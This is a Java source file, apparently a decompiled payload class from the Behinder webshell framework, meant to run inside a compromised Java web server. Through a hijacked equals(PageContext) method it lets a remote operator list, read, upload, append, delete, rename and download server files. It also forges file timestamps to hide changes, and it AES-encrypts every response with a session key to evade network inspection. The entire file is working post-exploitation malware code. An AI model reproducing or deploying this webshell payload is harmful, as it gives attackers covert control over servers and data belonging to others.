package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.URI;
import java.nio.charset.Charset;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class FileOperation {
   public static String mode;
   public static String path;
   public static String newPath;
   public static String content;
   public static String charset;
   public static String createTimeStamp;
   public static String modifyTimeStamp;
   public static String accessTimeStamp;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;
   private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));

   public boolean equals(Object obj) {
      PageContext page = (PageContext)obj;
      this.Session = page.getSession();
      this.Response = page.getResponse();
      this.Request = page.getRequest();
      this.Response.setCharacterEncoding("UTF-8");
      Object result = new HashMap();

      try {
         if (mode.equalsIgnoreCase("list")) {
            ((Map)result).put("msg", this.list(page));
            ((Map)result).put("status", "success");
         } else if (mode.equalsIgnoreCase("show")) {
            ((Map)result).put("msg", this.show(page));
            ((Map)result).put("status", "success");
         } else if (mode.equalsIgnoreCase("delete")) {
            result = this.delete(page);
         } else if (mode.equalsIgnoreCase("create")) {
            ((Map)result).put("msg", this.create(page));
            ((Map)result).put("status", "success");
         } else if (mode.equalsIgnoreCase("append")) {
            ((Map)result).put("msg", this.append(page));
            ((Map)result).put("status", "success");
         } else {
            if (mode.equalsIgnoreCase("download")) {
               this.download(page);
               return true;
            }

            if (mode.equalsIgnoreCase("rename")) {
               result = this.renameFile(page);
            } else if (mode.equalsIgnoreCase("createFile")) {
               ((Map)result).put("msg", this.createFile(page));
               ((Map)result).put("status", "success");
            } else if (mode.equalsIgnoreCase("createDirectory")) {
               ((Map)result).put("msg", this.createDirectory(page));
               ((Map)result).put("status", "success");
            } else if (mode.equalsIgnoreCase("getTimeStamp")) {
               ((Map)result).put("msg", this.getTimeStamp(page));
               ((Map)result).put("status", "success");
            } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
               ((Map)result).put("msg", this.updateTimeStamp(page));
               ((Map)result).put("status", "success");
            }
         }
      } catch (Exception var6) {
         var6.printStackTrace();
         ((Map)result).put("msg", var6.getMessage());
         ((Map)result).put("status", "fail");
      }

      try {
         ServletOutputStream so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
         page.getOut().clear();
      } catch (Exception var5) {
         var5.printStackTrace();
      }

      return true;
   }

   private Map warpFileObj(File file) {
      Map obj = new HashMap();
      obj.put("type", file.isDirectory() ? "directory" : "file");
      obj.put("name", file.getName());
      obj.put("size", file.length() + "");
      obj.put("perm", file.canRead() + "," + file.canWrite() + "," + file.canExecute());
      obj.put("lastModified", (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date(file.lastModified())));
      return obj;
   }

   private String list(PageContext page) throws Exception {
      String result = "";
      File f = new File(path);
      List objArr = new ArrayList();
      objArr.add(this.warpFileObj(new File(".")));
      objArr.add(this.warpFileObj(new File("..")));
      if (f.isDirectory() && f.listFiles() != null) {
         File[] var5 = f.listFiles();
         int var6 = var5.length;

         for(int var7 = 0; var7 < var6; ++var7) {
            File temp = var5[var7];
            objArr.add(this.warpFileObj(temp));
         }
      }

      result = this.buildJsonArray(objArr, true);
      return result;
   }

   private String show(PageContext page) throws Exception {
      if (charset == null) {
         charset = System.getProperty("file.encoding");
      }

      StringBuffer sb = new StringBuffer();
      File f = new File(path);
      if (f.exists() && f.isFile()) {
         InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
         BufferedReader br = new BufferedReader(isr);
         String str = null;

         while((str = br.readLine()) != null) {
            sb.append(str + "\n");
         }

         br.close();
         isr.close();
      }

      return sb.toString();
   }

   private String create(PageContext page) throws Exception {
      String result = "";
      FileOutputStream fso = new FileOutputStream(path);
      fso.write(this.base64decode(content));
      fso.flush();
      fso.close();
      result = path + "上传完成，远程文件大小:" + (new File(path)).length();
      return result;
   }

   private Map renameFile(PageContext page) throws Exception {
      Map result = new HashMap();
      File oldFile = new File(path);
      File newFile = new File(newPath);
      if (oldFile.exists() && oldFile.isFile() & oldFile.renameTo(newFile)) {
         result.put("status", "success");
         result.put("msg", "重命名完成:" + newPath);
      } else {
         result.put("status", "fail");
         result.put("msg", "重命名失败:" + newPath);
      }

      return result;
   }

   private String createFile(PageContext page) throws Exception {
      String result = "";
      FileOutputStream fso = new FileOutputStream(path);
      fso.close();
      result = path + "创建完成";
      return result;
   }

   private String createDirectory(PageContext page) throws Exception {
      String result = "";
      File dir = new File(path);
      dir.mkdirs();
      result = path + "创建完成";
      return result;
   }

   private void download(PageContext page) throws Exception {
      FileInputStream fis = new FileInputStream(path);
      byte[] buffer = new byte[1024000];
      int length = 0;
      ServletOutputStream sos = page.getResponse().getOutputStream();
      while((length = fis.read(buffer)) > 0) {
         sos.write(Arrays.copyOfRange(buffer, 0, length));
      }

      sos.flush();
      sos.close();
      fis.close();
   }

   private String append(PageContext page) throws Exception {
      String result = "";
      FileOutputStream fso = new FileOutputStream(path, true);
      fso.write(this.base64decode(content));
      fso.flush();
      fso.close();
      result = path + "追加完成，远程文件大小:" + (new File(path)).length();
      return result;
   }

   private Map delete(PageContext page) throws Exception {
      Map result = new HashMap();
      File f = new File(path);
      if (f.exists()) {
         if (f.delete()) {
            result.put("status", "success");
            result.put("msg", path + " 删除成功.");
         } else {
            result.put("status", "fail");
            result.put("msg", "文件" + path + "存在，但是删除失败.");
         }
      } else {
         result.put("status", "fail");
         result.put("msg", "文件不存在.");
      }

      return result;
   }

   private String getTimeStamp(PageContext page) throws Exception {
      String result = "";
      DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
      File f = new File(path);
      Map timeStampObj = new HashMap();
      if (f.exists()) {
         timeStampObj.put("modifyTimeStamp", df.format(new Date(f.lastModified())));
         if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
         }

         result = this.buildJson(timeStampObj, true);
         return result;
      } else {
         throw new Exception("文件不存在");
      }
   }

   private String updateTimeStamp(PageContext page) throws Exception {
      String result = "";
      DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
      File f = new File(path);
      if (f.exists()) {
         f.setLastModified(df.parse(modifyTimeStamp).getTime());
         String version = System.getProperty("java.version");
         if (version.compareTo("1.7") >= 0 && System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            Class PathsCls = Class.forName("java.nio.file.Paths");
            Class PathCls = Class.forName("java.nio.file.Path");
            Class BasicFileAttributeViewCls = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
            Class FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
            Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", PathCls, BasicFileAttributeViewCls);
            Object attributes = getFileAttributeView.invoke(PathsCls.getMethod("get", URI.class).invoke(path), BasicFileAttributeViewCls);
            Object createTime = FileTimeCls.getMethod("fromMillis", Long.class).invoke(df.parse(createTimeStamp).getTime());
            Object modifyTime = FileTimeCls.getMethod("fromMillis", Long.class).invoke(df.parse(modifyTimeStamp).getTime());
            Object accessTime = FileTimeCls.getMethod("fromMillis", Long.class).invoke(df.parse(accessTimeStamp).getTime());
            BasicFileAttributeViewCls.getMethod("setTimes", FileTimeCls, FileTimeCls, FileTimeCls).invoke(attributes, modifyTime, accessTime, createTime);
            if (!createTimeStamp.equals("")) {
            }

            if (!accessTimeStamp.equals("")) {
            }
         }

         result = "时间戳修改成功。";
         return result;
      } else {
         throw new Exception("文件不存在");
      }
   }

   private String buildJsonArray(List list, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = list.iterator();

      while(var4.hasNext()) {
         Map entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
      }

      return result;
   }
}
